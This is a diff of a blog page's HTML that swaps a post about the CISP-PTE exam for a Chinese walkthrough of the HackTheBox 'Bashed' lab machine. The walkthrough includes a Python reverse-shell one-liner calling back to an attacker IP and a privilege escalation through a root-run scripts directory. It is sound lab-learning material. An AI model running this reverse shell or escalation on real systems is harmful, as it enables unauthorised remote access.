@@ -9,7 +9,7 @@
     
     <title>
         
-            cisp-pte |
+            Bashed - HackTheBox |
         
         Td
     </title>
@@ -171,7 +171,7 @@
         <div class="article-content-container border-box">
 
             <div class="article-title">
-                <span class="title-hover-animation">cisp-pte</span>
+                <span class="title-hover-animation">Bashed - HackTheBox</span>
             </div>
 
             
@@ -197,13 +197,13 @@
         
             <span class="meta-info-item article-create-date">
                 <i class="icon fa-solid fa-calendar-check"></i>&nbsp;
-                <span class="pc">2022-10-20 10:05:13</span>
-                <span class="mobile">2022-10-20 10:05</span>
+                <span class="pc">2023-04-04 10:29:33</span>
+                <span class="mobile">2023-04-04 10:29</span>
             </span>
 
             <span class="meta-info-item article-update-date">
                 <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="pc">2022-10-25 10:05:10</span>
+                <span class="pc">2023-04-04 10:29:33</span>
             </span>
         
 
@@ -219,6 +219,9 @@
             <span class="article-tag meta-info-item border-box">
                 <i class="icon fas fa-tags"></i>&nbsp;
                 <ul>
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Hack-The-Box/">Hack-The-Box</a></li>
+                        
                     
                 </ul>
             </span>
@@ -241,59 +244,181 @@
             <div class="article-content keep-markdown-body">
                 
 
-                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直想着需不需要考个证书，毕竟看着大佬们那些堆起来的证书都感觉特别强。</p>
-<p>评估了一下自己的水平和钱包的厚度，看来看去，看到了国内的CISP认证系列。</p>
+                <p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox-Bashed/image.53lbbkg0g1w0.png"
+                     
+                ></p>
+<p>nmap扫描</p>
 <p><img  
                      lazyload
                      alt="image"
-                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/20230818/image.1266hocqf09s.webp"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox-Bashed/image.1x5rzlt7xngg.webp"
                      
                 ></p>
-<p>看看这可怕的时间要求，我只是一个刚毕业的小牛马，还够不着他的最低要求。</p>
-<p>后续我又了解到CISP的其他分支系列。</p>
 <p><img  
                      lazyload
                      alt="image"
-                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/20230818/image.79inhjjdjrk0.webp"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox-Bashed/image.6gf6xa7gg800.webp"
                      
                 ></p>
-<p>太多了，我一直学的是渗透，所以选择了CISP-PTE，没有选CISP-PTS的原因是，当时我在报名的时候，某机构报价是CISP-PTE学生6k，非学生8k，而CISP-PTS，起步则是一个w，我看了一眼钱包，它并不是很支持我去考虑CISP-PTS。</p>
-<h1 id="备考"><a href="#备考" class="headerlink" title="备考"></a>备考</h1><p>在报名之后，机构会开展一个几天的所谓的培训，如果事先有学习过，可以不用听，直接去做题就行了。</p>
-<p>题目大同小异，无非就是那些web漏洞罢了，主要是避免一些出题角度很偏的题目，如果没有事先练习过，可能在考试的时候会浪费很多时间。</p>
+<p>只开放了80端口，访问</p>
 <p><img  
                      lazyload
                      alt="image"
-                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/20230818/image.3u5q8nwp4q20.webp"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox-Bashed/image.1me0xzk5erls.webp"
                      
                 ></p>
-<p>这张图我觉得有点夸大其实了，CISP-PTE这个证书顶多算是一个入门级的认证，并不会有这么多的一个知识体系，而且其中涉及到的也只是轻描淡写的掠过，并不是很深入。</p>
-<p>之后便是做练习题，做练习题，做练习题…</p>
-<h1 id="考试过程"><a href="#考试过程" class="headerlink" title="考试过程"></a>考试过程</h1><p>因为当时疫情比较严重，本来是需要去线下考点进行考试的，改为了线上考试。</p>
-<p>考试要求两个手机进行画面拍摄，一个用于拍摄电脑画面，一个用于拍摄操作人画面，进入腾讯会议开启视频和语音，中途不允许退出。</p>
-<p>在考试前一天晚上，机构的人会来确认拍摄画面的正常与否，如果没有问题，那么第二天按照这个操作来即可。</p>
-<p>考试在上午10点，在进入会议室开启摄像头拍摄画面后，即可开始考试，考试是在一个虚拟环境中进行，会让你连接一个类似于浏览器的东西，这个连接以后不能切换后台，否则直接帮你交卷，过程中可以申请去厕所，限时五分钟，超时按作弊处理。</p>
-<p>题目比较简单，唯一难受的就是在虚拟化平台中操作，会很卡，并且拿到的二flag，无法复制提交，只能手打，并且提交时也不会验证是否正确，所以要一个一个的确认，开考半小时就把题目做完，还剩20道选择题，一题一分，满分100，70分算通过，所以我即使选择题不做，我也足以通过考试，但抱着能多点分就多一点的想法，就随便选完了。</p>
-<p>提交所有答案之后，我提前交卷完成考试，最终得分91分。</p>
+<p>搜索一下</p>
 <p><img  
                      lazyload
                      alt="image"
-                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/20230818/eaf3467738c2cc656d2b1cbcaa15268.56etwt1wor00.webp"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox-Bashed/image.2ln86i2q1cu0.webp"
                      
                 ></p>
-<p>稳稳的通过了考试，当然，这个只是算一个参考，如果后续在手机拍摄到的画面中，发现有作弊或者其他违规行为，那么考试成绩也会将被取消。</p>
-<p>最终证书需要等三个月的时间。</p>
+<p>这么简单？</p>
 <p><img  
                      lazyload
                      alt="image"
-                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/20230818/image.6hidpsykj900.webp"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox-Bashed/image.70htiarmt7o0.webp"
                      
                 ></p>
-<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>不得不说，这个证真的只是入门级的，从我考试开始到结束，我只用去了25分钟，但考都考了，多一个总比少一个好。</p>
+<p>扫一下目录</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox-Bashed/image.1q1h4gw6mwf4.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox-Bashed/image.4pw3wc45y000.webp"
+                     
+                ></p>
+<p>在dev目录下发现bash</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox-Bashed/image.3xfzfhqwke40.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox-Bashed/image.5m66hvmrumk0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox-Bashed/image.4rr9dwv2rri0.webp"
+                     
+                ></p>
+<p>想办法把shell反弹回来</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox-Bashed/image.3e60csqc8ye0.webp"
+                     
+                ></p>
+<p>不能直接反弹</p>
+<p>在本地写一个python反弹文件，在让他下载执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;10.10.14.19&quot;,7776)); os.dup2(s.fileno(),0);  os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox-Bashed/image.785wuwxrhls0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox-Bashed/image.5clnkrjew1w0.webp"
+                     
+                ></p>
+<p>看看有没有可以利用的</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox-Bashed/image.5z919scw1zg0.webp"
+                     
+                ></p>
+<p>发现一个scriptmanager用户，sudo -u scriptmanager bash -i切换过去</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox-Bashed/image.6a6ozysz1po0.webp"
+                     
+                ></p>
+<p>在根目录下有一个scripts文件夹</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox-Bashed/image.a9uib8t91q0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox-Bashed/image.2qherfvvtdi0.webp"
+                     
+                ></p>
+<p>执行脚本后会往test.txt文本中写入一段话，尝试删除test.txt</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox-Bashed/image.53ir5q3di640.webp"
+                     
+                ></p>
+<p>发现几分钟后又创建了一个，而且所有者为root</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox-Bashed/image.1yo14cv80af4.webp"
+                     
+                ></p>
+<p>由此可以推断，该目录下的所有脚本，会定时被root所执行，此时只需要一个反弹的python文件即可，继续使用上面反弹所用的python命令</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox-Bashed/image.20d2u5jor5og.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox-Bashed/image.52cwnr1p9dk0.webp"
+                     
+                ></p>
+<p>监听7766</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox-Bashed/image.68g9nn0h0l80.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox-Bashed/image.4gvkjx5bz0c0.webp"
+                     
+                ></p>
 
             </div>
 
             
 
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/Hack-The-Box/"><i class="icon fas fa-hashtag"></i>Hack-The-Box</a>&nbsp;
+                        </li>
+                    
+                </ul>
             
 
             
@@ -302,13 +427,13 @@
                         <div class="article-prev">
                             <a class="prev"
                                rel="prev"
-                               href="/2023/04/03/Lame%20-%20HackTheBox/"
+                               href="/2023/04/04/Nibbles%20-%20HackTheBox/"
                             >
                             <span class="left arrow-icon flex-center">
                               <i class="fas fa-chevron-left"></i>
                             </span>
                                 <span class="title flex-center">
-                                <span class="post-nav-title-item text-ellipsis">Lame - HackTheBox</span>
+                                <span class="post-nav-title-item text-ellipsis">Nibbles - HackTheBox</span>
                                 <span class="post-nav-item">上一篇</span>
                             </span>
                             </a>
@@ -318,10 +443,10 @@
                         <div class="article-next">
                             <a class="next"
                                rel="next"
-                               href="/2022/08/29/hello-world/"
+                               href="/2023/04/03/Brainfuck%20-%20HackTheBox/"
                             >
                             <span class="title flex-center">
-                                <span class="post-nav-title-item text-ellipsis">Hello World</span>
+                                <span class="post-nav-title-item text-ellipsis">Brainfuck - HackTheBox</span>
                                 <span class="post-nav-item">下一篇</span>
                             </span>
                                 <span class="right arrow-icon flex-center">
@@ -348,7 +473,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap">
     <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%87%E8%80%83"><span class="nav-number">2.</span> <span class="nav-text">备考</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%80%83%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="nav-number">3.</span> <span class="nav-text">考试过程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%93%E8%AF%AD"><span class="nav-number">4.</span> <span class="nav-text">结语</span></a></li></ol>
+        
     </div>
 </div>
 
@@ -510,7 +635,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap">
     <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%87%E8%80%83"><span class="nav-number">2.</span> <span class="nav-text">备考</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%80%83%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="nav-number">3.</span> <span class="nav-text">考试过程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%93%E8%AF%AD"><span class="nav-number">4.</span> <span class="nav-text">结语</span></a></li></ol>
+        
     </div>
 </div>
 
